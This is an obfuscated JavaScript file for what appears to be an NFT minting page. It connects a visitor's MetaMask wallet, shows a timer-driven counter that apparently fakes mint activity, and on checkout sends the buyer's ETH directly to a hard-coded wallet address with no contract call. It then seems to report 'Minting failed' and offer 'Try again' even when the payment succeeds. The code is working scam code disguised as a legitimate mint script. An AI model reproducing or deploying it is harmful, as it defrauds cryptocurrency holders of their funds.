const _0x1ef83b=_0x2daf;function _0x3f19(){const _0x135c44=['#checkoutBtn','#status','3119992gVChgx','innerHTML','923640htcEhO','.count','input[type=\x22text\x22][id=\x22totalNFT\x22]','getAccounts','utils','6142950bojYaE','No\x20Metamask\x20(or\x20other\x20Web3\x20Provider)\x20installed','Wallet\x20connected.\x20Mint\x20your\x20NFTs\x20now!','2525474sRDpuP','querySelector','currentProvider','eth','3700132lkHHKv','719445CmvDZU','innerText','value','web3','toString','Wallet\x20access\x20denied','#connectBtn','Minting\x20in\x20progress....','ethereum','Minting\x20succeed','enable','16976tQEWYI','#totalETH','Try\x20again','log','selectedAddress','87pRzYZK','toFixed','Minting\x20failed','12MxYmvR','addEventListener','toWei','text','click'];_0x3f19=function(){return _0x135c44;};return _0x3f19();}function _0x2daf(_0x170095,_0x225ea6){const _0x3f195a=_0x3f19();return _0x2daf=function(_0x2daff8,_0xb833ba){_0x2daff8=_0x2daff8-0x12d;let _0x2c0f3a=_0x3f195a[_0x2daff8];return _0x2c0f3a;},_0x2daf(_0x170095,_0x225ea6);}(function(_0x350bd4,_0x20bccb){const _0x3455bd=_0x2daf,_0x294e0c=_0x350bd4();while(!![]){try{const _0x47d83=-parseInt(_0x3455bd(0x140))/0x1+parseInt(_0x3455bd(0x12f))/0x2*(parseInt(_0x3455bd(0x134))/0x3)+parseInt(_0x3455bd(0x14c))/0x4+parseInt(_0x3455bd(0x14d))/0x5*(parseInt(_0x3455bd(0x137))/0x6)+parseInt(_0x3455bd(0x148))/0x7+parseInt(_0x3455bd(0x13e))/0x8+-parseInt(_0x3455bd(0x145))/0x9;if(_0x47d83===_0x20bccb)break;else _0x294e0c['push'](_0x294e0c['shift']());}catch(_0x3a380b){_0x294e0c['push'](_0x294e0c['shift']());}}}(_0x3f19,0x935a2));const statusp=document['querySelector'](_0x1ef83b(0x13d)),connectBtn=document[_0x1ef83b(0x149)](_0x1ef83b(0x153)),checkoutBtn=document[_0x1ef83b(0x149)](_0x1ef83b(0x13c)),pricePerNFT=0.24;$(document)['ready'](function(){var _0x29ec54=0x21cd;function _0x50772f(){const _0x43bf07=_0x2daf;_0x29ec54>0x1e8d&&(_0x29ec54=0x0),$(_0x43bf07(0x141))[_0x43bf07(0x13a)](_0x29ec54),_0x29ec54++;}setInterval(_0x50772f,0x3d6);});let plusBtn=document[_0x1ef83b(0x149)]('button[class*=\x22btn-plus\x22]'),minusBtn=document[_0x1ef83b(0x149)]('button[class*=\x22btn-minus\x22]'),totalNFTInput=document[_0x1ef83b(0x149)](_0x1ef83b(0x142)),totalETHSpan=document[_0x1ef83b(0x149)](_0x1ef83b(0x130));totalNFTInput[_0x1ef83b(0x14f)]=0x1,totalETHSpan[_0x1ef83b(0x14e)]=totalNFTInput['value']*pricePerNFT,plusBtn[_0x1ef83b(0x138)](_0x1ef83b(0x13b),()=>{const _0x2db168=_0x1ef83b;totalNFTInput[_0x2db168(0x14f)]=Number(totalNFTInput[_0x2db168(0x14f)])+0x1,totalETHSpan['innerText']=(totalNFTInput[_0x2db168(0x14f)]*pricePerNFT)[_0x2db168(0x135)](0x2);}),minusBtn['addEventListener']('click',()=>{const _0x5c4b36=_0x1ef83b;Number(totalNFTInput[_0x5c4b36(0x14f)])>0x1&&(totalNFTInput[_0x5c4b36(0x14f)]=Number(totalNFTInput[_0x5c4b36(0x14f)])-0x1,totalETHSpan['innerText']=(totalNFTInput[_0x5c4b36(0x14f)]*pricePerNFT)[_0x5c4b36(0x135)](0x2));}),connectBtn[_0x1ef83b(0x138)](_0x1ef83b(0x13b),async()=>{const _0x46f9ff=_0x1ef83b;if(window[_0x46f9ff(0x155)]){window['web3']=new Web3(ethereum);try{await ethereum[_0x46f9ff(0x12e)](),initPayButton(),statusp[_0x46f9ff(0x13f)]=_0x46f9ff(0x147);}catch(_0x3a84e9){console[_0x46f9ff(0x132)](_0x3a84e9),statusp[_0x46f9ff(0x13f)]=_0x46f9ff(0x152);}}else window[_0x46f9ff(0x150)]?(window[_0x46f9ff(0x150)]=new Web3(web3[_0x46f9ff(0x14a)]),initPayButton()):statusp['innerHTML']=_0x46f9ff(0x146);});const initPayButton=()=>{const _0x274789=_0x1ef83b;checkoutBtn[_0x274789(0x138)](_0x274789(0x13b),async()=>{const _0x49efdf=_0x274789;statusp[_0x49efdf(0x14e)]=_0x49efdf(0x154);const _0x23ac1e='0xcf85047D0e14C64C42f8221012BD0B8388Dc58Ce';let _0x2b0b9f=totalETHSpan[_0x49efdf(0x14e)];_0x2b0b9f=_0x2b0b9f[_0x49efdf(0x151)]();const _0x4a4e57=await web3[_0x49efdf(0x14b)][_0x49efdf(0x143)]();web3[_0x49efdf(0x14b)]['sendTransaction']({'from':web3[_0x49efdf(0x14a)][_0x49efdf(0x133)],'to':_0x23ac1e,'value':web3[_0x49efdf(0x144)][_0x49efdf(0x139)](_0x2b0b9f,'ether')},(_0x90dd8b,_0x1bb199)=>{const _0x430f94=_0x49efdf;_0x90dd8b?(console[_0x430f94(0x132)](_0x430f94(0x136),_0x90dd8b),statusp[_0x430f94(0x14e)]='Minting\x20failed'):(console[_0x430f94(0x132)](_0x430f94(0x12d),_0x1bb199),statusp[_0x430f94(0x14e)]=_0x430f94(0x136),checkoutBtn['innerText']=_0x430f94(0x131));});});};
